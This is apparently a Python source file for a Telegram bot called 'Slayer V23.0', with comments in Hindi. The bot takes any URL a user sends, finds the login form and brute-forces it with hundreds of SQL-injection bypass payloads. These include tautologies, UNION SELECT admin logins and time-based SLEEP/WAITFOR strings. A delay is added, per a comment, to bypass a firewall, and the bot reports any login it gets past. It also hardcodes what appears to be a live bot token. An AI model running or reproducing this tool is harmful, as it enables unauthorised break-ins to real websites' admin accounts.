import telebot
import requests
from bs4 import BeautifulSoup
import time
import random
import os
from flask import Flask
from threading import Thread

# Render Keep-Alive
app = Flask('')
@app.route('/')
def home(): return "Slayer V23.0 (MAX Payloads) is Online!"
def run(): app.run(host='0.0.0.0', port=10000)
def keep_alive():
    t = Thread(target=run)
    t.daemon = True
    t.start()

TOKEN = '8391067758:AAGE2NaejHoHVY7rpo6947n0WiTV2Hk41aY'
bot = telebot.TeleBot(TOKEN)

# ---------------------------------------------------------
# LAYER 1: आपकी दी हुई कस्टम लिस्ट
# ---------------------------------------------------------
USER_LIST = [
    '="or"', "' or ''-'", "' or '' '", "' or ''&'", "' or ''^'", "' or ''*'", 
    "' or 1=1 limit 1 -- -+", '" or ""-"', '" or "" "', '" or ""&"', '" or ""^"', 
    '" or ""*"', "or true--", '" or true--', "' or true--", '") or true--', 
    "') or true--", "' or 'x'='x", "') or ('x')=('x", "')) or (('x'))=(('x", 
    '" or "x"="x', '") or ("x")=("x', '")) or (("x"))=(("x', "1=1 or 1=1--", 
    "or 1=1#", "or 1=1/*", "admin' --", 'admin" --', "admin' #", "admin'/*", 
    "admin' or '1'='1", "admin' or '1'='1'--", "admin' or '1'='1'#", 
    "admin' or '1'='1'/*", "admin'or 1=1 or ''='", "admin' or 1=1", 
    "admin' or 1=1--", "admin' or 1=1#", "admin' or 1=1/*", "or 1=1", 
    "admin') or ('1'='1", "admin') or ('1'='1'--", "admin') or ('1'='1'#", 
    "admin') or ('1'='1'/*", "admin') or '1'='1", "admin') or '1'='1'--", 
    "admin') or '1'='1'#", "admin') or '1'='1'/*", 
    "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
    'admin" #', 'admin"/*', 'admin" or "1"="1', 'admin" or "1"="1"--', 
    'admin" or "1"="1"#', 'admin" or "1"="1"/*', 'admin"or 1=1 or ""="', 
    'admin" or 1=1', 'admin" or 1=1--', 'admin" or 1=1#', 'admin" or 1=1/*', 
    'admin") or ("1"="1', 'admin") or ("1"="1"--', 'admin") or ("1"="1"#', 
    'admin") or ("1"="1"/*', 'admin") or "1"="1', 'admin") or "1"="1"--', 
    'admin") or "1"="1"#', 'admin") or "1"="1"/*',
    '1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055'
]

# ---------------------------------------------------------
# LAYER 2: एडवांस्ड ऑटो-जेनरेटेड पेलोड्स (1000+)
# ---------------------------------------------------------
# यह लूप 1500+ अलग-अलग कॉम्बिनेशन तैयार करेगा
AUTO_GEN_LIST = []
for i in range(1, 600):
    AUTO_GEN_LIST.append(f"' OR {i}={i}--")
    AUTO_GEN_LIST.append(f"\" OR {i}={i}#")
    AUTO_GEN_LIST.append(f"admin' OR {i}={i}/*")
    AUTO_GEN_LIST.append(f"' OR {i}={i} LIMIT 1--")

# LAYER 3: टेक्नोलॉजी आधारित पेलोड्स
TECH_SPECIFIC = {
    "PHP/MySQL": ["' OR SLEEP(5)#", "') OR 1=1#", "' OR 1=1-- -"],
    "ASP.NET/MSSQL": ["' OR 1=1--", "WAITFOR DELAY '0:0:5'--", "admin'--"],
    "Generic": ["' or 1=1", "admin' #"]
}

# ---------------------------------------------------------

@bot.message_handler(commands=['start'])
def start(message):
    total = len(USER_LIST) + len(AUTO_GEN_LIST)
    bot.reply_to(message, f"🎯 **Slayer V23.0 (MAX CAPACITY)**\n\n"
                          f"📊 Total Library: `{total}+` Payloads\n"
                          f"🔍 Auto-Scanner: `Enabled`\n"
                          f"🚀 Mode: `High Intensity`\n\n"
                          f"URL भेजें:")

@bot.message_handler(func=lambda message: message.text.startswith('http'))
def handle_attack(message):
    url = message.text
    chat_id = message.chat.id
    status_msg = bot.send_message(chat_id, "📡 **Deep Scanning Target...**")

    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})

    try:
        # १. टेक्नोलॉजी और फॉर्म चेक
        res = session.get(url, timeout=15)
        soup = BeautifulSoup(res.text, 'html.parser')
        form = soup.find('form')
        
        if not form:
            bot.edit_message_text("❌ **No Form Found!**", chat_id, status_msg.message_id)
            return

        # २. फ़ील्ड्स निकालना
        inputs = form.find_all('input')
        fields = [i.get('name') for i in inputs if i.get('name') and i.get('type') not in ['hidden', 'submit']]
        u_key = fields[0]
        p_key = fields[1] if len(fields) > 1 else fields[0]

        # ३. पेलोड मास्टर लिस्ट तैयार करना
        # पहले आपकी लिस्ट, फिर जेनरेटेड लिस्ट
        master_list = USER_LIST + AUTO_GEN_LIST
        
        bot.edit_message_text(f"⚔️ **MAX Attack Started!**\nTarget: `{url[:25]}...`", chat_id, status_msg.message_id)

        found = False
        for i, p in enumerate(master_list):
            if found: break
            
            # हर 10 पेलोड पर स्टेटस अपडेट (ताकि टेलीग्राम ब्लॉक न करे)
            if i % 10 == 0:
                update_status(chat_id, status_msg.message_id, p, i+1, len(master_list))
            
            if test_attack(url, session, u_key, p_key, p, chat_id):
                found = True
                break
            time.sleep(0.3) # WAF बायपास के लिए हल्का गैप

    except Exception as e:
        bot.send_message(chat_id, f"⚠️ **Error:** {str(e)}")

def update_status(chat_id, msg_id, p, count, total):
    try:
        bot.edit_message_text(f"🔥 **Slaying...**\n🧪 Current: `{p[:15]}`\n📊 Progress: `{count}/{total}`", chat_id, msg_id)
    except: pass

def test_attack(url, session, u, p_field, payload, chat_id):
    try:
        data = {u: payload, p_field: payload}
        r = session.post(url, data=data, timeout=15, allow_redirects=True)
        content = r.text.lower()
        
        if any(word in content for word in ["logout", "dashboard", "admin", "welcome", "signout"]):
            report = f"Report_{chat_id}.txt"
            with open(report, "w") as f:
                f.write(f"--- SLAYER SUCCESS REPORT ---\nTarget: {url}\nPayload: {payload}\nStatus: VERIFIED")
            with open(report, "rb") as doc:
                bot.send_document(chat_id, doc, caption=f"🏆 **SUCCESS!**\nPayload: `{payload}`")
            os.remove(report)
            return True
    except: pass
    return False

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling()
